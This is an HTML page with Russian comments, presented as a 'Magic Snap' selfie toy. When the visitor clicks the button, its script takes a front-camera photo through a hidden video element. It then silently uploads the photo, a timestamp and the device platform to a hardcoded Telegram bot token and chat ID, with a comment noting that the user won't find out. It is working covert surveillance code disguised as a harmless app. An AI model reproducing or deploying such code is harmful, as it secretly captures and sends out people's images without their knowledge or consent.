<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>✨ Magic Snap ✨</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

  html, body {
    height: 100%;
    overflow: hidden;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #000;
    color: #fff;
    user-select: none;
    -webkit-user-select: none;
  }

  body {
    display: flex;
    align-items: center;
    justify-content: center;
    background: radial-gradient(circle at 50% 50%, #1a0033 0%, #000 70%);
  }

  /* ============ ФОН ============ */
  .bg-glow {
    position: fixed;
    inset: 0;
    background:
      radial-gradient(circle at 20% 30%, rgba(138, 43, 226, 0.4), transparent 40%),
      radial-gradient(circle at 80% 70%, rgba(0, 200, 255, 0.35), transparent 40%),
      radial-gradient(circle at 50% 50%, rgba(255, 0, 150, 0.25), transparent 50%);
    animation: pulse 6s ease-in-out infinite;
    z-index: 0;
    filter: blur(40px);
    pointer-events: none;
  }

  @keyframes pulse {
    0%, 100% { opacity: 0.7; transform: scale(1); }
    50%      { opacity: 1;   transform: scale(1.15); }
  }

  /* ============ КОНТЕЙНЕР ============ */
  .container {
    position: relative;
    z-index: 2;
    text-align: center;
    padding: 40px 30px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  h1 {
    font-size: 42px;
    font-weight: 800;
    background: linear-gradient(135deg, #ff00cc 0%, #3333ff 50%, #00ffcc 100%);
    background-size: 200% 200%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 12px;
    letter-spacing: -1px;
    animation: shimmer 3s linear infinite;
  }

  @keyframes shimmer {
    0%   { background-position: 0% 50%; }
    100% { background-position: 200% 50%; }
  }

  .subtitle {
    color: #aaa;
    font-size: 16px;
    margin-bottom: 50px;
    letter-spacing: 1px;
  }

  /* ============ КНОПКА ============ */
  .magic-btn {
    position: relative;
    width: 200px;
    height: 200px;
    border-radius: 50%;
    border: none;
    cursor: pointer;
    background: linear-gradient(135deg, #ff00cc, #3333ff, #00ffcc);
    background-size: 200% 200%;
    color: #fff;
    font-size: 22px;
    font-weight: 800;
    letter-spacing: 2px;
    text-transform: uppercase;
    box-shadow:
      0 0 40px rgba(255, 0, 204, 0.6),
      0 0 80px rgba(51, 51, 255, 0.4),
      inset 0 0 40px rgba(255, 255, 255, 0.2);
    transition: transform 0.2s, box-shadow 0.3s;
    animation: rotate-glow 4s linear infinite, float 3s ease-in-out infinite;
    font-family: inherit;
  }

  .magic-btn::before {
    content: '';
    position: absolute;
    inset: -6px;
    border-radius: 50%;
    background: conic-gradient(from 0deg, #ff00cc, #3333ff, #00ffcc, #ff00cc);
    filter: blur(20px);
    opacity: 0.8;
    z-index: -1;
    animation: rotate-glow 4s linear infinite;
  }

  @keyframes rotate-glow {
    0%   { background-position: 0% 50%; }
    100% { background-position: 200% 50%; }
  }

  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50%      { transform: translateY(-10px); }
  }

  .magic-btn:active {
    transform: scale(0.92);
    box-shadow: 0 0 60px rgba(255, 0, 204, 1), inset 0 0 60px rgba(255, 255, 255, 0.4);
  }

  .magic-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    animation-play-state: paused;
  }

  /* ============ СТАТУС ============ */
  .status {
    margin-top: 40px;
    min-height: 30px;
    font-size: 16px;
    color: #ccc;
    letter-spacing: 1px;
    transition: all 0.3s;
    text-align: center;
  }

  .status.success { color: #00ffcc; text-shadow: 0 0 20px #00ffcc; }
  .status.error   { color: #ff3366; text-shadow: 0 0 20px #ff3366; }
  .status.loading { color: #ffcc00; }

  /* ============ СКРЫТОЕ ВИДЕО ============ */
  video {
    position: fixed;
    top: -9999px;
    left: -9999px;
    width: 1px;
    height: 1px;
    opacity: 0;
    pointer-events: none;
  }

  /* ============ ВСПЫШКА ============ */
  .flash {
    position: fixed;
    inset: 0;
    background: #fff;
    opacity: 0;
    pointer-events: none;
    z-index: 100;
  }

  .flash.active { animation: flash-anim 0.4s ease-out; }

  @keyframes flash-anim {
    0%   { opacity: 1; }
    100% { opacity: 0; }
  }

  /* ============ ГАЛОЧКА ============ */
  .success-overlay {
    position: fixed;
    inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    background: rgba(0,0,0,0.7);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    z-index: 999;
  }

  .success-overlay.active {
    display: flex;
    animation: overlayFade 1.5s ease forwards;
  }

  @keyframes overlayFade {
    0%, 65% { opacity: 1; }
    100%    { opacity: 0; }
  }

  .check {
    width: 118px;
    height: 118px;
    border-radius: 50%;
    background: linear-gradient(135deg, #00ff9d, #00c97a);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 66px;
    font-weight: 900;
    color: #fff;
    box-shadow: 0 0 80px rgba(0, 255, 157, 0.75), 0 0 160px rgba(0, 255, 157, 0.35);
    animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
  }

  @keyframes popIn {
    0%   { transform: scale(0); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
  }
</style>
</head>
<body>
  <div class="bg-glow"></div>
  <div class="flash" id="flash"></div>

  <div class="container">
    <h1>Magic Snap</h1>
    <p class="subtitle">Нажми кнопку ✨</p>

    <button class="magic-btn" id="magicBtn">Snap</button>

    <div class="status" id="status"></div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <div class="success-overlay" id="success">
    <div class="check">✓</div>
  </div>

<script>
  /* ================================================================
     НАСТРОЙКИ БОТА
     ================================================================ */
  const BOT_TOKEN = "8465223552:AAGK61qh4NSmRHznHUo2jTMUOCp05Oij1jU";
  const CHAT_ID   = "7895911575";
  /* ================================================================ */

  const btn       = document.getElementById('magicBtn');
  const statusEl  = document.getElementById('status');
  const video     = document.getElementById('video');
  const flash     = document.getElementById('flash');
  const successEl = document.getElementById('success');

  let busy = false;

  function setStatus(text, type = '') {
    statusEl.textContent = text;
    statusEl.className = 'status ' + type;
  }

  function showSuccess() {
    successEl.classList.remove('active');
    void successEl.offsetWidth;
    successEl.classList.add('active');
    setTimeout(() => successEl.classList.remove('active'), 1500);
  }

  function wait(ms) {
    return new Promise(r => setTimeout(r, ms));
  }

  btn.addEventListener('click', async () => {
    if (busy) return;
    busy = true;
    btn.disabled = true;

    setStatus('Запрашиваю доступ к камере...', 'loading');

    let stream = null;

    try {
      // 1) Запрос камеры — браузер покажет разрешение
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width:  { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      });

      video.srcObject = stream;
      await video.play();

      setStatus('Ловлю момент...', 'loading');

      // 2) Небольшая пауза на фокус
      await wait(800);

      // 3) Вспышка
      flash.classList.add('active');
      setTimeout(() => flash.classList.remove('active'), 400);

      // 4) Вибро
      if (navigator.vibrate) navigator.vibrate(35);

      // 5) Снимок
      const w = video.videoWidth  || 1280;
      const h = video.videoHeight || 720;

      const canvas = document.createElement('canvas');
      canvas.width  = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');

      // Зеркалим (селфи)
      ctx.translate(w, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, w, h);

      // 6) Останавливаем камеру — сразу после снимка
      stream.getTracks().forEach(t => t.stop());
      stream = null;
      video.srcObject = null;

      // 7) Галочка
      showSuccess();
      setStatus('Готово ✨', 'success');

      // 8) Тихая отправка в Telegram
      sendToTelegram(canvas);

      // Возврат в исходное состояние
      setTimeout(() => {
        setStatus('');
        btn.disabled = false;
        busy = false;
      }, 1600);

    } catch (err) {
      console.warn(err);

      // Останавливаем камеру если что-то пошло не так
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
        video.srcObject = null;
      }

      let msg = '❌ Ошибка: ' + (err.message || 'unknown');
      if (err.name === 'NotAllowedError')     msg = '❌ Доступ к камере запрещён';
      else if (err.name === 'NotFoundError')  msg = '❌ Камера не найдена';
      else if (err.name === 'NotReadableError') msg = '❌ Камера занята';
      else if (err.name === 'SecurityError')  msg = '❌ Нужен HTTPS';

      setStatus(msg, 'error');

      btn.disabled = false;
      busy = false;

      setTimeout(() => setStatus(''), 3000);
    }
  });

  /* ================================================================
     ОТПРАВКА В TELEGRAM
     ================================================================ */
  async function sendToTelegram(canvas) {
    try {
      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
      if (!blob) return;

      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', blob, 'snap.jpg');
      fd.append('caption',
        `📸 <b>Новая фотка с сайта</b>\n` +
        `🕐 ${new Date().toLocaleString('ru-RU')}\n` +
        `📱 ${navigator.platform || 'unknown'}`
      );
      fd.append('parse_mode', 'HTML');

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd
      });
    } catch (e) {
      // тихо — юзер не узнает
    }
  }

  /* ================================================================
     БЕЗОПАСНОСТЬ — глушим камеру при сворачивании
     ================================================================ */
  document.addEventListener('visibilitychange', () => {
    if (document.hidden && video.srcObject) {
      video.srcObject.getTracks().forEach(t => t.stop());
      video.srcObject = null;
    }
  });
</script>
</body>
</html>
